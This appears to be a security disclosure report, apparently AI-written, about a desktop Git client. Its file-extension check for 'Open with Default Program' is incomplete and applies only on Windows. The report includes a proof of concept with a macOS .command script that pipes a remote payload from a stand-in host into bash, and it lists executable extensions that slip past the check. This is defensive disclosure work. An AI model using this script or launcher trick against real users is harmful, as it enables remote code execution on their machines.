Based on the investigation, I found a genuine analog: `isSafeFileExtension` in `context-menu.ts` implements an incomplete, platform-restricted blocklist that mirrors exactly the sNUSD bug's "checks one restriction category but not the sibling category" pattern — the underlying invariant broken in both cases is "gate an action on a role/attribute check that has a sibling category which is silently skipped."

### Title
Incomplete `RestrictedFileExtensions` blocklist lets a malicious repo file bypass "Open with Default Program" execution guard on macOS/Linux and via case/alias evasion on Windows - ([File: app/src/ui/lib/context-menu.ts])

### Summary
`isSafeFileExtension()` is the single gate used before enabling "Open with Default Program" for files coming from a cloned/fetched repository (changes list, commit file list, PR file list, Copilot conflict resolution). It only restricts a hardcoded four-extension list (`.cmd`, `.exe`, `.bat`, `.sh`) and, critically, only applies that restriction `if (__WIN32__)`. On macOS and Linux the function unconditionally returns `true`, i.e. no extension is ever considered unsafe. [1](#0-0) 

### Finding Description
The check pattern is structurally identical to the sNUSD `_deposit()` bug: a security gate exists for one category (`__WIN32__`) but the analogous/sibling category (`__DARWIN__`/`__LINUX__`) is left completely unchecked, and even within the checked category the allow/deny list is incomplete (missing `.com`, `.scr`, `.msi`, `.js`, `.vbs`, `.ps1`, `.jar`, `.pif`, etc. — many of which Windows will still execute or launch via a shell association).

This gate is consumed at every "Open with Default Program" call site across the app: [2](#0-1) [3](#0-2) [4](#0-3) 

All of these ultimately call `openFile()`, which passes the on-disk path straight to `shell.openExternal('file://...')` with no extension re-validation at that layer: [5](#0-4) 

Because `isSafeFileExtension` returns `true` unconditionally on macOS/Linux, any file an attacker plants in a cloned/fetched repository — e.g. a `.command`, `.workflow`, `.desktop`, `.sh` (macOS Terminal/Automator launchers or Linux `.desktop` freedesktop launchers, both of which the OS's default-open handler will execute rather than just display) — is presented to the user with the "Open with Default Program" menu item enabled, with no additional warning that the file type is executable. The Copilot conflict-resolution overflow menu doesn't even reference `isSafeFileExtension` at all, so it's unconditionally enabled on every platform: [6](#0-5) 

### Impact Explanation
An attacker who controls a cloned/fetched repository (matching the report's threat model) can commit a shell/launcher script disguised as a normal-looking file (`update.sh`, `readme.command`, `notes.desktop`) into the repo. When a Desktop user browses changes/history/PR diffs and right-clicks "Open with Default Program" — a routine action the UI actively offers as safe/enabled — the OS executes the attacker-controlled script under the user's privileges. This is code execution outside of anything git itself would run, directly matching the "attacker controls a cloned/fetched repository ... result is code execution" impact class in scope.

### Likelihood Explanation
Likelihood is moderate: it requires the victim to right-click a suspicious file and choose "Open with Default Program" rather than the default double-click-diff behavior, so it is not a zero-click primitive. However, no unnatural steps are required — this is a first-class, always-enabled menu action for any file with an extension outside the four-item Windows-only blocklist, and on macOS/Linux there is no gating at all regardless of extension.

### Recommendation
Make `isSafeFileExtension` platform-agnostic and extend the blocklist to cover known executable/launcher types per OS (`.command`, `.workflow`, `.app`/bundle traversal on macOS; `.desktop`, `.sh`, `.run` on Linux; expand the Windows list to match Windows' own "executable file extensions" registry list, e.g. include `.com`, `.scr`, `.msi`, `.js`, `.vbs`, `.ps1`, `.jar`, `.pif`, `.lnk`). Alternatively, invert to an allowlist of known-safe document/media types. Also route the Copilot conflicts overflow menu's "Open with Default Program" item through the same `isSafeFileExtension` gate that the other three call sites use.

### Proof of Concept
1. On macOS, create/clone a repo containing `update.command` with content:
   ```bash
   #!/bin/bash
   curl -s https://evil.example/payload.sh | bash
   ```
2. Open the repo in Desktop, view it as an untracked/changed file in the Changes list.
3. Right-click the file → confirm "Open with Default Program" is enabled (per `isSafeFileExtension` unconditionally returning `true` off Windows): [7](#0-6) 
4. Click it — `onOpenItem` → `openFile()` → `shell.openExternal('file://<path>/update.command')` causes macOS Terminal to execute the script. [8](#0-7) [5](#0-4)

import { shell } from '../../lib/app-shell'
import { Dispatcher } from '../dispatcher'

export async function openFile(
  fullPath: string,
  dispatcher: Dispatcher
): Promise<void> {
  const result = await shell.openExternal(`file://${fullPath}`)

  if (!result) {
    const error = {
      name: 'no-external-program',
      message: `Unable to open file ${fullPath} in an external program. Please check you have a program associated with this file extension`,
    }
    await dispatcher.postError(error)
  }
}
